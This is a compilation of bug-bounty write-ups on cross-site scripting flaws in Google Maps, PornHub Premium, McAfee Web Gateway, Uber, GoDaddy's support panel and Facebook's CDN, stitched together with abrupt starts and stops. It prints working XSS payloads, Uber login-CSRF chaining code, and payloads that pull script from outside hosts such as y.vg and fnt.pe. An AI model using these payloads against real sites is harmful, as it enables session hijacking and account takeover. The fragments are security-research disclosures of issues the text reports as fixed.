undocumented format we found, the Javascript alert box valiantly shows up! Our original XSS payload looked like this. 🎉 Let’s be even more clever and see what fields can be encoded without using any HTML-related chars. Browsers such as Chrome have filters to detect and block XSS when HTML is present both in request and response, that’s also the case of Firefox with extensions such as NoScript. Filter-escaping wit comes in here! The “!”-separated data decoding routine accepts two data types corresponding to strings, even if it’s originally one Protobuf type. The “s” type character allows you to encode strings raw as part of the output string, only with “!” and “*” escaped as “*21” and “*2A” (the corresponding hex codes). The “z” character type allows you to encode the string as base64 (simple flavour, without padding). Know what, filter-based XSS defences are rendered useless. The same payload, once the HTML string was base64-encoded. And you can obfuscate even more, as it turned out the server converts on the fly the “!”-separated data to raw binary Protobuf, and most types are cast without check, and remember, strings and messages both share the same of the five data types in binary format. So, you can simply convert nested messages to binary, and pass them as strings, exposing even less what they do, and look more cool. The same payload, once we converted nested messages to wire format, then cast to base64 string — now that’s unintelligible. Now we have a XSS payload that will work with anything — Chrome, Firefox, Safari, whatever accepts Javascript — on the www.google.com domain, as the former maps.google.com was dropped to put back the service on the main domain… Just for the sake of cleverness, let’s find another way. It turns out anyone can submit new places to Google Maps, that may appear on the map with more or less moderation (a posteriori). Did someone submit a <script>alert(1)</script> place to the map already? Sure, some Chinese and Indian guys did, one even showing off its hacker face of dread! Press enter or click to view image in full size With Google Maps, find nearby hot hackers from your area A payload leveraging an existing place on the map. We have four exciting ways to exploit this neat 0-day — this looks enough. Let’s move to the next step. Vendor response Google provides standardized rewards for most security bugs, as described on the page for its vulnerability reward program . In our case, a proper XSS on the www.google.com domain will usually trigger a $5,000 bounty. Day 0 — I fill in the report form . Day 0.54 — My report is triaged, already! Day 0.64 — My report is validated, bug filed. Day 1 (or so) — Well, this is fixed. Day 1.84 — Press enter or click to view image in full size You know what, great bounty gets turned into motivation, and great motivation gets turned in open-source. The project The code linked to this research since got a bit more substantial: I looked around for more, and seen that a lot of applications on the Android platform (including Maps’) use Protobuf, and it seemed to have a lack of an unified tool for extracting these structures (a few localized scripts existed but targeted specific apps or implementation flavours, and mostly didn’t support Proguard). And desktop apps, mostly in C++ existed in addition to mobile Java stuff. So I started to glue together scripts I wrote on a few occasions, put a same GUI behind, added a few features, and it started to look like something. You can find the current state of the project that departed from this at https://github.com/marin-m/pbtk . Here are the main parts of the code discussed above: extractors/web_extract.py : that’s the main extraction .proto script, that launches Chrome, connects to its depths and does the stunning work. You can use it individually, just pass an URL as an argument. views/fuzzer.py : that’s the little GUI editing and replaying requests. It’s now integrated to the larger app, and that you can play with launching the GUI (gui.py) and clicking “Step 3…”. It will look for .protos stored in a folder of you home directory, as explained in the interface. In addition, the code required to encode back and forth URL parameters in the “!”-separated format is bundled as a module in utils/pburl_decoder.py . It is included by the previous. That’s the end of this note — hope you appreciated it, and see you later for more reverse engineering adventures!

When PornHub launched their public bug bounty program, I was pretty sure that most of the low hanging fruits of vulnerabilities would be taken care of and already reported. When I first started poking around, I found my first vulnerability in less than 15 minutes. The second vulnerability was found a few minutes afterward. I have never in my entire bug hunting career found bugs this quickly, so it was pretty exciting. In return, I received two payments of $250 and a really really cool T-Shirt + stickers that I posted on Reddit here: When I posted this on Reddit I had no idea it would be so popular and raise so many questions. Most people asked “What was the hack?” followed by “Why would you hack PornHub?” and I couldn’t talk about it until…now. (These vulnerabilities have now been fixed.) I found and reported two reflected cross-site scripting (XSS) vulnerabilities within 20 minutes of browsing the PornHub Premium website. Cross site scripting, if you don’t know what that is, is a type of vulnerability that enables an attacker to run dangerous scripts on a website. OWASP sums it up pretty nicely here: An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. The first one was found using the “redeem code” section of the site – it didn’t check to see if the code being entered in the text input for the redeem code was an actual payload, so I was able to use the following payload to reflect the script on the page: PAYLOAD+STACK++%3E%27\" /Autof<K>ocus /O<K>nfocus=confirm`1`//&error=1 The first part of the payload “PAYLOAD STACK” ensures that the rest of the payload is sent through. If I entered: ++%3E%27\" /Autof<K>ocus /O<K>nfocus=confirm`1`//&error=1 Without the words in front of it, the application would reject it and nothing would appear on the page. Entering something non-malicious to begin would trick the validator, and in turn, allow the payload to execute. The second vulnerability was also a XSS. This was was a bit simpler, and was found by entering a payload in a URL parameter that only appears once to new users… which is why I think it wasn’t found until now – most bug hunters like to get a feel of a website before they start poking around and trying to get things to break, but usually I take the different approach and use incognito windows so that the website thinks it’s the first time I’ve ever visited the site before. This is where the vulnerability existed. I noticed that the PornHub Premium site was mostly off-limits unless you paid to access it. Before you could even pay, there is a “pop-up” window that displays to the user that they are going to be viewing pornography and to either enter or exit by clicking on a button. What I also noticed is that once you selected “enter”, there was a part of the URL that changed and added a parameter. This vulnerable parameter was &compliancePop=no_gateway – this is where I was able to enter: &compliancePop=no_gateway%22-confirm`1`-%22 And I got a really nice “1” to appear on the screen, which shows evidence of cross-site scripting. I reported both of these vulnerabilities to PornHub and they were triaged within 24 hours. I’d like to thank the folks at PornHub for running such a fair, quick responding program and keeping their users safe. Also – thanks for the amazing T-Shirt! Thanks also to the folks at Reddit for being so interested in this that I had to send over 200 pm’s to people who wanted to know what I did…hopefully this lives up to the promise that I would tell you about it, and sorry it took so long. I have other bugs and vulnerabilities that are cooler and more intense than this one coming soon, so check back later and I’ll share them with you.

Near universal XSS in McAfee Web Gateway Olivier Arteau 4 min read · Mar 17, 2017 -- Listen Share In this blog post, a vulnerability in the McAfee Web Gateway will be presented. The vulnerability was disclosed on September 15th 2016 to McAfee and was fixed on October 12th 2016 with the release of Web Gateway 7.6.2.5. XSS are a common vulnerability in web application, but the one presented here is of a very different nature from the ones we typically see. But first let’s look at how the product works at a high level. McAfee Web Gateway is essentially an enterprise proxy server that will filter the content based on rules. It allows company to control what people can visit when they are within the company network. To properly work, the McAfee Web Gateway also generates a root certificate that can be installed on the devices of the company. This allows the proxy to change the response of HTTPS traffic to something else. The main use case of this traffic alteration is to display custom HTTP error when a domain is blocked or doesn’t exist. When it happens, a page like the one below is returned to the user. Press enter or click to view image in full size Image Source : https://kc.mcafee.com/library/MCAFEE/CORPORATE_USER/CORP_TS_AGENT/Webwasher/KB69994_f.png What initially got me interested about this page was that the entire requested URL was visible in the response. Looking at the HTML of the page, we could see the following HTML. <!-- Info --> <table class=”infoTable”> <tr> <td class=\"infoData\"> <b>URL : </b><script type=\"text/javascript\">break_line(\" http://d igg.com\");</script><br /> </td> </tr> </table> <!-- /Info --> The break_line JavaScript function had, at the time, the following definition. It essentially inserts a “<wbr />” tag every 20 characters and outputs the content directly in the page. function break_line(lineToBreak) { if (lineToBreak != '') { var len = lineToBreak.length; var splitStr = '<wbr />'; for (var i = 0; i < len;) { lineToBreak = lineToBreak.substring(0, i) + splitStr + lineToBreak.substring(i); i += 20 + splitStr.length; len += splitStr.length; } document.write(lineToBreak); } } The next question I asked myself was which encoding did it applied to the reflected URL ? With minimal fuzzing, I found that it takes the received URL and does an HTML encoding for the key HTML character (<, > and “). But is it the correct way to encode it ? To explore this question we first have to look at the context in which it’s reflected. The reflected URL passes in two contexts. The first one being a JavaScript string and then in an HTML context (the break_line function). The correct way to encode content is to apply a context specify encoding for each context that it will be passed to from the last context to the first one. In this case, it means doing an HTML encoding and then a JavaScript encoding ( result = javascript_encode(html_encode(data)) ). If we come back a bit we know that it’s only doing an HTML encoding, which means that the JavaScript encoding is missing. One of the interesting things that can be done when one of the context specific encoding is missing is to use alternate character encoding. In HTML “a” can also be written as “&#97;” and in JavaScript “a” can also be written as “\\x61” and “\\u0061”. Since the HTML encoding won’t encode the “\\” character, we can rewrite character that would normally be encoded by the HTML encoding using an alternate JavaScript encoding (“<” changed to “\\x3c”). This basically allows us to output any character and bypass the HTML encoding. But the journey towards a fully functional proof of concept doesn’t stop here. If we remember previously, the JavaScript function break_line inserts a <wbr /> every 20 characters and this will get in the way of a standard XSS payload. So we need a way to write longer payload or bootstrap them. The easiest way that I found to deal with this limitation is to start each 20 characters segment with a */ and end it with a /*. This places the <wbr /> tag in JavaScript comment. This leaves us with 16 characters per segment. One of the solution that I found, was to use this as the first segment \\x3cscript\\x3e/*AAAAAAAAAA*/a=String;b=/*AAAAA*/a.fromCharCode(/*A*/ Use this as the last segment. */);eval(b);/*AAAAAA*/\\x3c/script\\x3e Use the other segments to provide the ASCII value for each character of our JavaScript payload. With this, I was able to make a first functional proof of concept. http://aaaa.perdu.com/favicon.ico?AAAAAA\\x3cscript\\x3e/*AAAAAAAAAA*/a=String;b=/*AAAAA*/a.fromCharCode(/*A*/97,108,101,114,/*A*/116,40,119,105,/*A*/110,100,111,119,/**/46,108,111,99,/*AA*/97,116,105,111,/*A*/110,41/*AAAAAAAAAA*/);eval(b);/*AAAAAA*/\\x3c/script\\x3e Do note that for longer payload, using an intermediate payload along the lines of eval(unescape(location.hash.substr(1))) and placing the full JavaScript payload after the “#” in the URL is a lot more practical. So we can now execute any arbitrary JavaScript with our XSS, but for it to be useful we have to understand how to trigger those error pages. The most reliable way to trigger it is by visiting an URL where the domain doesn’t resolve to anything. Most domain name don’t catch all subdomains which means that you can get for most domain an XSS on doesnotexists.maindomain.com. While this doesn’t give you a direct access to other subdomains or the main domain, the browser gives special privilege to subdomain like setting cookies for *.maindomain.com . Also, since any request will be performed from a subdomain of maindomain.com, if the server trust its subdomains for CORS request, it can also lead to data stealing. Another way to trigger the error page for arbitrary domain is when the proxy is flooded and can no longer respond to request. This is in practice hard to obtain reliably, but will allow an XSS to be obtained on any domain. The XSS payload simply has to wait for the flood to end and then make any request with XHR. There are probably other ways to trigger those error pages, but I don’t know the product well enough and the proof of concept was already interesting enough to warrant a fix.

Here’s the full content:\n\nMy \"Public Evernote\": Turning Self-XSS into Good XSS v2: Challenge Completed but Not Rewarded My \"Public Evernote\" Monday, 29 August 2016 Turning Self-XSS into Good XSS v2: Challenge Completed but Not Rewarded This appears to be the issue which I was digging for the most time during my bugbounty experience, it took more than two months to find a perfect solution for a problem. TL;DR I found Self-XSS on m.uber.com in late March 2016, and inspired by Jack's post I didn't give up, aiming to find a way to turn it to Good-XSS. Finally, I found arbitrary cookie install vulnerability on business.uber.com , which allowed to install arbitrary cookies for *.uber.com for Safari users. Chaining two bugs together could lead to Good XSS on m.uber.com , and allowed to steal oauth2 cookie of any logged-in user. Another bughunter reported Self-XSS on the same domain while Uber team was resolving my issue, which resulted a fix of Self-XSS and refusal of appropriate reward. Chaining bugs. Step 1 : Self-XSS Self-Stored XSS on m.uber.com launches on index page when user simply logges in. My way to add XSS into profile was by modifying existing business profile name via mobile application. As it appeared later, there was another way to do that . Step 2 : Arbitrary cookie installation Surprisingly, user can be authenticated on m.uber.com by only presenting COOKIE \" token \", apart from (riders|login|partners|anything).uber.com , which needs another COOKIE - oauth2 . Hence, if it is somehow possible to login victim user into our account with Self Stored XSS, it is possible to steal oauth2 cookie of a real user (since it is scoped to *.uber.com ) and perform any other malicious actions. Arbitrary cookie install vulnerability was very lucky to find on page https://business.uber.com/new/confirm/[exploit-here] , and is based on the fact that user input comes into server's response, directly into Cookie header and is not properly sanitized. Hence it was possible to install various cookies for any *.uber.com subdomain ( original research here ): https://business.uber.com/new/confirm/test;,arbitrary=cookie;domain=.uber.com Combining these two minor vulnerabilities, we can attack any external user: first login victim into account with Self-XSS, and then trigger XSS against him. PoC exploit code : < script > function exploit ( ) { setTimeout( function ( ) { var s1 = new XMLHttpRequest(); // first request is necessary for exploitation s1.open( 'GET' , 'https://m.uber.com/' , false ); s1.send( null ); document .location.href= 'https://m.uber.com/' ; // now redirecting to page }, 3000 ); } </ script > < body onload = \"exploit()\" > < script > var xmlhttp = new XMLHttpRequest(); xmlhttp.open( 'GET' , 'https://business.uber.com/new/confirm/test;,token= XXXXXXXXXXXXXXX ;domain=.uber.com' , false ); // insert your token here xmlhttp.send( null ); </ script > Good news (it works!): My exploit was working since late March, and was also working at the time of my report to Uber (May 9): Bad news: I provided all evidence that Self-XSS was found by me some time before it was reported by another researcher. Unlikely, Self-XSS was silently patched several hours after I reported the issue through Hackerone, and I received ` We're having some trouble reproducing your proof of concept <...> Thanks again and good luck in your future bug hunting. ` message from triage team. After involving Hackerone team into discussion, I got rewarded for 1000$ for arbitrary cookie installation, instead of 5k+ (Stored XSS with ability to steal sensitive COOKIE data). Takeaway: Never stop trying to elevate found vulnerabilities, and please don't report non-security issues out-of-scope for having only +7 of reputation, when you have a feeling that the vulnerability is potentially exploitable under higher privileges. Otherwise you will be literally killing someone's bounty - and what is worse, you will never improve. Posted by httpsonly at 14:27 Email This BlogThis!

I think it's closer to reflected XSS than stored in terms of risk though as it involves visiting a malicious external page.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nPoisoning the Well – Compromising GoDaddy Customer Support With Blind XSS – The Hacker Blog The Hacker Blog FlashHTTPRequest JudasDNS XSS Hunter tarnish Home Poisoning the Well – Compromising GoDaddy Customer Support With Blind XSS May 08, 2016 Reading time ~7 minutes Home tarnish XSS Hunter JudasDNS FlashHTTPRequest | Follow @IAmMandatory Poisoning the Well – Compromising GoDaddy Customer Support With Blind XSS This is the first part of a series of stories of compromising companies via blind cross-site scripting. As companies fix the issues and allow me to disclose them, I will post them here. Blind cross-site scripting (XSS) is an often-missed class of XSS which occurs when an XSS payload fires in a browser other than the attackerâs/pentesterâs. This flavour of XSS is often missed by penetration testers due to the standard alert box approach being a limited methodology for finding these vulnerabilities . When your payloads are all <script>alert(1)</script> youâre making the assumption that the XSS will fire in your browser, when itâs likely it will fire in other places and in other browsers. Without a payload that notifies you regardless of the browser it fires in, youâre probably missing out on the biggest vulnerabilities. Poisoning the Well One of the interesting things about using a blind XSS tool (in my case Iâm using XSS Hunter ) is that you can sprinkle your payloads across a service and wait until someone else triggers them. The more you test for blind XSS the more you realize the game is about âpoisoningâ the data stores that applications read from. For example, a users database is likely read by more than just the main web application. There is likely log viewing apps, administrative panels, and data analytics services which all draw from the same end storage. All of these services are just as likely to be vulnerable to XSS if not more because they are often not as polished as the final web service that the end customer uses. To make a physical comparison, blind XSS payloads act more like mines which lie dormant until someone triggers them. Yes, my name is <script src=//y.vg></script>. GoDaddy is a perfect example of the above. While using GoDaddy I noticed that my first and last name could be set to an XSS payload. I opted to use my generic for both fields: Humorously, I had completely forgotten that I had done so until I later had a problem with one of my domains. Later on I called GoDaddyâs customer support to try to get a domain transferred to a different registrar. The agent appeared to be having trouble looking up my account due to their systems âexperiencing issuesâ. It was then my phone vibrated twice indicating I had just gotten two emails in rapid succession. As it turns out, those emails were notifications that my previously planted XSS payloads had fired: It appears that GoDaddyâs internal customer support panel was indeed vulnerable to XSS! I made an excuse about having to deal with a personal matter and ended the support call. After investigating the report generated by XSS Hunter, the DOM capture gave away why the support rep was having troubles: <script type=\"text/javascript\"> var CRM = CRM || {}; CRM.Shopper = CRM.Shoper || { }; CRM.Shopper.JSON = {\"shopperId\":\"34729611\",\"privateLabelId\":1,\"accountInfo\":{\"accountUsageTypeId\":0,\"emailTypeID\":2},\"personalInfo\":{\"firstName\":\"\\\"><script src=https://y.vg></script><script src=\"https://img4.wsimg.com/starfield/sf.core/v1.8.5/sf.core.js\" async=\"\" charset=\"utf-8\"></script></head><body>\",\"lastName\":\"\\\"><script src=\"https://y.vg\"></script><iframe scrolling=\"no\" style=\"visibility: hidden; position: absolute; top: -10000px; left: -10000px;\" height=\"889\" width=\"1264\"></iframe>\",\"company\":\"\\\"><script src=\"https://y.vg\"></script></body> As can be seen in the above DOM capture, my XSS payload borked the JSON displayed in the webpage body and escaped the Impact Using this vulnerability I could perform any action as the GoDaddy customer rep. This is a bad deal because GoDaddy representatives have the ability to do basically anything with your account. On other support calls with GoDaddy my agent was able to do everything from modifying account information, to transferring domain names, to deleting my account altogether. In a real attack scenario, the next step for exploitation would be to inject a proper BeEF hook into the agentâs browser to ride their session (using XSS Hunterâs JavaScript chainload functionality) and use the support website as them. However, since Iâm not malicious I opted to report the issue to them shortly after finding it (see below Disclosure Timeline). Blind XSS Remediation â Keeping the Well Clean This story brings up an interesting point about XSS remediation. While the standard remediation for XSS is generally contextually-aware output encoding , you can actually get huge security gains from preventing the payloads from being stored at all. When you do proper output encoding, you have to do it on every system which pulls data from your data store. However, if you simply ensure that the stored data is clean you can prevent exploitation of many systems because the payload would never be able to be stored in the first place. Obviously, ideally you would have both, but for companies with many services drawing from the same data sources you can get a lot of win with just a little filtering. This is the approach that GoDaddy took for remediation, likely for the same reasons. Disclosure Timeline *I apologize if some of these dates are a day or two offÂ as Cobalt (the bug bounty service GoDaddy uses) has awful timestamps which round up to the nearest month if you go far enough back. For this reason I donât have exact timestamps for all of this, but I try to be as close as possible. 12/28/15 â Emailed [email protected] about reporting the security vulnerability. 12/29/15 â After some research, emailed [email protected] instead about reporting the issue. 12/30/15 â Invited to GoDaddyâs private bug bounty program. 12/30/15 â Reported vulnerability via Cobaltâs bug bounty web service. 02/06/16 â GoDaddy closed issue as a duplicate stating the following: âThis is actually a known issue and we are working to resolve it. Also keep in mind that our bug bounty only covers www.godaddy.com and sso.godaddy.com. crm.int.godaddy.com would be considered out of scope. But since this has already been reported since you need to create a username/password at sso.godaddy.com, I am not counting it as out of scope; just a duplicate.â 02/06/16 â Requested public disclosure after three months pass, due to high severity of issue (and the fact that it was known to them before I reported it, making it unclear how long the issue has existed). 02/06/16 â GoDaddy responds with the following: âWe appreciate you letting us know of the severity of this issue. We are definitely working on this, and when we fix the issue, we will let you know the status of this. You may want to follow up in a few weeks with us. Since you have now heard from us, we respectfully ask that you do not disclose this until we have fixed it. Please keep in mind that you agreed to the Cobalt/GoDaddy terms of agreement when you signed up for our Bug Bounty. The agreement states: âYou may disclose vulnerabilities only after proper remediation has occurred and may not disclose any confidential information without prior written consent.â The full agreement can be found at: https://cobalt.io/godaddy-betaâ 02/07/16 â Agree to not disclose until the issue is fixed. 02/07/16 â 04/07/16 â Multiple pings to the GoDaddy bug bounty team asking on the status of the issue. 04/11/16 â After waiting ~3 months I respond with the following: âHey @[REDACTED] checking in on an update. Iâm a little disappointed in the response time on this because of how critical this vulnerability is. Iâm moving my domains off of GoDaddy this week (since they could all be stolen/accessed using this issue) but for other GoDaddy users this is still outstanding critical issue that affects them. Iâve waited over three months so far for a fix so I feel giving this one more month until public disclosure takes place is fair (this is more time than Googleâs Project Zero gives: http://googleprojectzero.blogspot.com/2015/02/feedback-and-data-driven-updates-to.html). To clarify, the reason behind disclosure is not to extort (I donât care about reward) but only to make other GoDaddy users aware of the outstanding issue (and also to incentivize a fix). I am aware this violates the Terms of Service of Cobalt.io am not super concerned about being banned as this is the only bug bounty Iâve participated in which is hosted here. Let me know your thoughts on this timeline. Thanks.â 04/13/16 â Pinged GoDaddy to ensure they got the above message. 04/13/16 â GoDaddy responds with: âHi Mandatory, we have received your reply and I am escalating this issue internally. As soon as I hear from the development team, I will reply with details and hopefully a timeline for remediation.â 04/20/16 â Checked in on fix status. 04/20/16 â GoDaddy responds with: âThis issue has involved several teams from the front and backend. They have pushed out some minor changes but are still working on fixing the entire issue from front to back. Feel free to follow up in a few days or some time next week. Hopefully weâll have fixed the issue completely.â 04/25/16 â GoDaddy responds with: âJust wanted to update you that our developers have deployed code changes which should now prevent XSS from happening on account usernames and account profile information such as your first and last name. Feel free to test and let us know if you are still able to replicate the issue.â 04/27/16 â Confirmed that you can no longer set your profile information to an XSS payload.

This is part one of maybe two or three posts. On Uber’s Partners portal , where Drivers can login and update their details, I found a very simple, classic XSS: changing the value of one of the profile fields to <script>alert(document.domain);</script> causes the code to be executed, and an alert box popped. This took all of two minutes to find after signing up, but now comes the fun bit. Self-XSS Being able to execute additional, arbitrary JavaScript under the context of another site is called Cross-Site Scripting (which I’m assuming 99% of my readers know). Normally you would want to do this against other users in order to yank session cookies, submit XHR requests, and so on. If you can’t do this against another user - for example, the code only executes against your account, then this is known as a self-XSS. In this case, it would seem that’s what we’ve found. The address section of your profile is only shown to you (the exception may be if an internal Uber tool also displays the address, but that’s another matter), and we can’t update another user’s address to force it to be executed against them. I’m always hesitant to send in bugs which have potential (an XSS in this site would be cool), so let’s try and find a way of removing the “self” part from the bug. Uber OAuth Login Flow The OAuth that flow Uber uses is pretty typical: User visits an Uber site which requires login, e.g. partners.uber.com User is redirected to the authorisation server, login.uber.com User enters their credentials User is redirected back to partners.uber.com with a code, which can then be exchanged for an access token In case you haven’t spotted from the above screenshot, the OAuth callback, /oauth/callback?code=... , doesn’t use the recommended state parameter. This introduces a CSRF vulnerability in the login function, which may or may-not be considered an important issue. In addition, there is a CSRF vulnerability in the logout function, which really isn’t considered an issue. Browsing to /logout destroys the user’s partner.uber.com session, and performs a redirect to the same logout function on login.uber.com . Since our payload is only available inside our account, we want to log the user into our account, which in turn will execute the payload. However, logging them into our account destroys their session, which destroys a lot of the value of the bug (it’s no longer possible to perform actions on their account). So let’s chain these three minor issues (self-XSS and two CSRF’s) together. For more info on OAuth security, check out @homakov’s awesome guide . Chaining Minor Bugs Our plan has three parts to it: First, log the user out of their partner.uber.com session, but not their login.uber.com session. This ensures that we can log them back into their account Second, log the user into our account, so that our payload will be executed Finally, log them back into their account, whilst our code is still running, so that we can access their details Step 1. Logging Out of Only One Domain We first want to issue a request to https://partners.uber.com/logout/ , so that we can then log them into our account. The problem is that issuing a requets to this end-point results in a 302 redirect to https://login.uber.com/logout/ , which destroys the session. We can’t intercept each redirect and drop the request, since the browser follows these implicitly. However, one trick we can do is to use Content Security Policy to define which sources are allowed to be loaded (I hope you can see the irony in using a feature designed to help mitigate XSS in this context). We’ll set our policy to only allow requests to partners.uber.com , which will block https://login.uber.com/logout/ . <!-- Set content security policy to block requests to login.uber.com, so the target maintains their session --> <meta http-equiv= \"Content-Security-Policy\" content= \"img-src https://partners.uber.com\" > <!-- Logout of partners.uber.com --> <img src= \"https://partners.uber.com/logout/\" > This works, as indicated by the CSP violation error message: Step 2. Logging Into Our Account This one is relatively simple. We issue a request to https://partners.uber.com/login/ to initiate a login (this is needed else the application won’t accept the callback). Using the CSP trick we prevent the flow being completed, then we feed in our own code (which can be obtained by logging into our own account), which logs them in to our account. Since a CSP violation triggers the onerror event handler, this will be used to jump to the next step. <!-- Set content security policy to block requests to login.uber.com, so the target maintains their session --> <meta http-equiv= \"Content-Security-Policy\" content= \"img-src partners.uber.com\" > <!-- Logout of partners.uber.com --> <img src= \"https://partners.uber.com/logout/\" onerror= \"login();\" > <script> //Initiate login so that we can redirect them var login = function () { var loginImg = document . createElement ( ' img ' ); loginImg . src = ' https://partners.uber.com/login/ ' ; loginImg . onerror = redir ; } //Redirect them to login with our code var redir = function () { //Get the code from the URL to make it easy for testing var code = window . location . hash . slice ( 1 ); var loginImg2 = document . createElement ( ' img ' ); loginImg2 . src = ' https://partners.uber.com/oauth/callback?code= ' + code ; loginImg2 . onerror = function () { //Redirect to the profile page with the payload window . location = ' https://partners.uber.com/profile/ ' ; } } </script> Step 3. Switching Back to Their Account This part is the code that will be contained as the XSS payload, stored in our account. As soon as this payload is executed, we can switch back to their account. This must be in an iframe - we need to be able to continue running our code. //Create the iframe to log the user out of our account and back into theirs var loginIframe = document . createElement ( ' iframe ' ); loginIframe . setAttribute ( ' src ' , ' https://fin1te.net/poc/uber/login-target.html ' ); document . body . appendChild ( loginIframe ); The contents of the iframe uses the CSP trick again: <!-- Set content security policy to block requests to login.uber.com, so the target maintains their session --> <meta http-equiv= \"Content-Security-Policy\" content= \"img-src partners.uber.com\" > <!-- Log the user out of our partner account --> <img src= \"https://partners.uber.com/logout/\" onerror= \"redir();\" > <script> //Log them into partners via their session on login.uber.com var redir = function () { window . location = ' https://partners.uber.com/login/ ' ; }; </script> The final piece is to create another iframe, so we can grab some of their data. //Wait a few seconds, then load the profile page, which is now *their* profile setTimeout ( function () { var profileIframe = document . createElement ( ' iframe ' ); profileIframe . setAttribute ( ' src ' , ' https://partners.uber.com/profile/ ' ); profileIframe . setAttribute ( ' id ' , ' pi ' ); document . body . appendChild ( profileIframe ); //Extract their email as PoC profileIframe . onload = function () { var d = document . getElementById ( ' pi ' ). contentWindow . document . body . innerHTML ; var matches = /value=\" ([^ \" ] + ) \" name=\"email\"/ . exec ( d ); alert ( matches [ 1 ]); } }, 9000 ); Since our final iframe is loaded from the same origin as the Profile page containing our JS, and X-Frame-Options is set to sameorigin not deny , we can access the content inside of it (using contentWindow ) Putting It All Together After combining all the steps, we have the following attack flow: Add the payload from step 3 to our profile Login to our account, but cancel the callback and make note of the unused code parameter Get the user to visit the file we created from step 2 - this is similar to how you would execute a reflected-XSS against someone The user will then be logged out, and logged into our account The payload from step 3 will be executed In a hidden iframe, they’ll be logged out of our account In another hidden iframe, they’ll be logged into their account We now have an iframe, in the same origin containing the user’s session This was a fun bug, and proves that it’s worth persevering to show a bug can have a higher impact than originally thought. websec bugbounty xss selfxss uber Updated on March 22, 2016 Jack Like Tweet +1 Read More From Bug Bounty Hunter, to Engineer, and Beyond A couple weeks ago I had my last day on Facebook's Product Security team.

The captioning feature of Videos also stores the .srt files on the CDN, and I noticed that right-angle brackets were un-encoded. https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-xaf1/….srt I was trying to think of ways to get the file interpreted as HTML. Maybe MIME sniffing (since there’s no X-Content-Type-Option header)? It’s actually a bit easier than that. We can just change the extension to .html (which probably shouldn’t be possible…). https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-xaf1/t39.2093-6/….html Unfortunately left angles are stripped out (which I later found out was due to @phwd ’s very much related finding ), so there’s not much we can do here. Instead, I looked for other files which could also be loaded as text/html . A lot of the photos/videos on Facebook now seem to contain a hash in the URL (parameters oh and __gda__ ), which causes an error to be thrown if we modify the file extension. Luckily, advert images don’t contain these parameters. All that we have to do now is find a way to embed some HTML into an image. The trouble is that Exif data is stripped out of JPEGs, and iTXt chunks are stripped out of PNGs. If we try to blindly insert a string into an image and upload it we receive an error. PNG IDAT Chunks I started searching for ideas and came across this great blog post: “Encoding Web Shells in PNG IDAT chunks” . This section of this bug is made possible due that post, so props to the author. The post describes encoding data into the IDAT chunk, which ensures it’ll stay there even after the modifications Facebook’s image uploader makes. The author kindly provides a proof-of-concept image , which worked perfectly (the PHP shell obviously won’t execute, but it demonstrates that the data survived uploading). Now, I could have submitted the bug there and then - we’ve got proof that images can be served with a content type of text/html , and angle brackets aren’t encoded (which means we can certainly inject HTML). But that’s boring, and everyone knows an XSS isn’t an XSS without an alert box. The author also provides an XSS ready PNG , which I could just upload and be done. But since it references a remote JS file, I wasn’t too keen on the bug showing up in a referer log. Plus I wanted to try myself to create one of these images. As mentioned in post, the first step is to craft a string, that when compressed using DEFLATE , produces the desired output. Which in this case is: <SCRIPT src=//FNT.PE><script> Rather than trying to create this by hand, I used a brute-force solution (I’m sure there are much better ways, but I wanted to whip up a script and leave it running): Convert the desired output to hex - 3c534352495054205352433d2f2f464e542e50453e3c2f7363726970743e Prepend 0x00 -> 0xff to the string (one to two times) Append 0x00 -> 0xff to the string (one to two times) Attempt to uncompress the string until an error isn’t thrown Check that the result contains our expected string The script took a while to run, but it produced the following output: 7ff399281922111510691928276e6e5c1e151e51241f576e69b16375535b6f Compressing the above confirms that we get our string back: fin1te@mbp /tmp » php -r \"echo gzdeflate(hex2bin('7ff399281922111510691928276e6e5c1e151e51241f576e69b16375535b6f')) . PHP_EOL;\" ??<SCRIPT SRC=//FNT.PE></script> Combining the result, with the PHP code for reversing PNG filters and generating the image, gives us the following: Which, when dumped, shows our payload: fin1te@mbp /tmp » hexdump -C xss-fnt-pe-png.png 00000000 89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52 |.PNG........IHDR| 00000010 00 00 00 20 00 00 00 20 08 02 00 00 00 fc 18 ed |... ... ........| 00000020 a3 00 00 00 09 70 48 59 73 00 00 0e c4 00 00 0e |.....pHYs.......| 00000030 c4 01 95 2b 0e 1b 00 00 00 65 49 44 41 54 48 89 |...+.....eIDATH.| 00000040 63 ac ff 3c 53 43 52 49 50 54 20 53 52 43 3d 2f |c.. <SCRIPT SRC=/ | 00000050 2f 46 4e 54 2e 50 45 3e 3c 2f 73 63 72 69 70 74 | /FNT.PE></script | 00000060 3e c3 ea c0 46 8d 17 f3 af de 3d 73 d3 fd 15 cb | > ...F.....=s....| 00000070 43 2f 0f b5 ab a7 af ca 7e 7d 2d ea e2 90 22 ae |C/......~}-...\".| 00000080 73 85 45 60 7a 90 d1 8c 3f 0c a3 60 14 8c 82 51 |s.E`z...?..`...Q| 00000090 30 0a 46 c1 28 18 05 a3 60 14 8c 82 61 00 00 78 |0.F.(...`...a..x| 000000a0 32 1c 02 78 65 1f 48 00 00 00 00 49 45 4e 44 ae |2..xe.H....IEND.| 000000b0 42 60 82 |B`.| We can then upload it to our advertiser library, and browse to it (with an extension of .html ). Bypassing Link Shim What can you do with an XSS on a CDN domain? Not a lot. All I could come up with is a LinkShim bypass. LinkShim is script/tool which all external links on Facebook are forced through. This then checks for malicious content. CDN URL’s however aren’t Link Shim’d, so we can use this as a bypass. Moving from the Akamai CDN hostname to *.facebook.com Redirects are pretty boring. So I thought I’d check to see if any *.facebook.com DNS entries were pointing to the CDN. I found photo.facebook.com (I forgot to screenshot the output of dig before the patch, so here’s an entry from Google’s cache): Browsing to this host with our image as the path loads a JavaScript file from fnt.pe , which then displays an alert box with the hostname. Any session cookies are marked as HTTPOnly , and we can’t make requests to www.facebook.com . What do we do other than popping an alert box? Enter document.domain It’s possible for two pages from a different origin, but sharing the same parent domain, to interact with each other, providing they both set the document.domain property to the parent domain. We can easily do this for our page, since we can run arbitrary JavaScript. But we also need to find a page on www.facebook.com which does the same, and doesn’t have an X-Frame-Options header set to 